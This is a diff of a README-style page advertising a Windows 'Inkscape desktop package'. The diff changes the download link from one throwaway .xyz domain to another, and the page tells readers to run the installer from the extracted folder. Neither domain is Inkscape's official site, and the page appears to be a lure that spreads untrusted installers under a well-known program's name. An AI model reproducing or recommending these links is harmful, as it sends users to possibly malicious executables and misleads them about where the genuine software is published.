@@ -8,8 +8,8 @@ Inkscape desktop package for Windows · photo toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-* **Project link:** **[inkscape.nexpath.xyz](https://inkscape.nexpath.xyz/)**
-* **Full URL:** `https://inkscape.nexpath.xyz/`
+* **Project link:** **[inkscape.nerasix.xyz](https://inkscape.nerasix.xyz/)**
+* **Full URL:** `https://inkscape.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
